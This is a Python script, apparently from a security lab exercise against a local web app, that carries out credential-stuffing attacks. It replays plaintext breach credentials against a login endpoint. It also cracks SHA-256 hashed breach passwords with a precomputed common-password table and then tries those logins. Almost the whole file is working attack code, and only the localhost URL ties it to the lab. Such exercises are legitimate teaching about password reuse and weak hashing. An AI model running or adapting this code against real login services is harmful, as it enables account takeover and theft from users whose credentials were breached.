from csv import reader
from requests import post, codes
import hashlib

LOGIN_URL = "http://localhost:8080/login"

PLAINTEXT_BREACH_PATH = "app/scripts/breaches/plaintext_breach.csv"
COMMON_PASSWORDS_PATH = "common_passwords.txt"
HASHED_BREACH_PATH = "app/scripts/breaches/hashed_breach.csv"

def load_breach(fp):
    with open(fp) as f:
        r = reader(f, delimiter=' ')
        header = next(r)
        assert(header[0] == 'username')
        return list(r)

def attempt_login(username, password):
    response = post(LOGIN_URL,
                    data={
                        "username": username,
                        "password": password,
                        "login": "Login",
                    })
    return response.status_code == codes.ok

def credential_stuffing_attack(creds):
    out = []
    # api-endpoint
    URL = "http://localhost:8080/login"

    for cred in creds:
        username = cred[0]
        password = cred[1]

        # sending get request and saving the response as response object
        r = attempt_login(username, password)

        # extracting data in json format
        if r:
            out.append(cred)

    return out

def load_common_passwords(fp):
    f = open(fp)
    file_as_list = f.readlines()
    return file_as_list

def create_lookup_from_common_passwords(fp):
    out = {}
    common_pwds = load_common_passwords(fp)
    for common_pwd in common_pwds:
        common_pwd = common_pwd.rstrip("\n")
        hash_obj = hashlib.sha256(common_pwd.encode('utf-8'))
        out.setdefault(hash_obj.hexdigest(), common_pwd)
    return out

def credential_stuffing_attack_for_hashed(fp):
    out = []
    # find all hashed passwords commonly used
    hashed_passwords_lookup = create_lookup_from_common_passwords(fp)
    # load all breached accounts
    creds = load_breach(HASHED_BREACH_PATH)
    # for each breached account, see if hashed passwords exit
    for cred in creds:
        if hashed_passwords_lookup.get(cred[1]):
            out.append([cred[0], hashed_passwords_lookup.get(cred[1])])

    # now login with the accounts for which we found hashed password
    newout = []
    for cred in out:

        # sending get request and saving the response as response object
        r = attempt_login(cred[0], cred[1])

        # extracting data in json format
        if r:
            newout.append(cred)

    return newout

def main():
    creds = load_breach(PLAINTEXT_BREACH_PATH)
    # credential_stuffing_attack(creds)
    # credential_stuffing_attack_for_hashed(COMMON_PASSWORDS_PATH)

if __name__ == "__main__":
    main()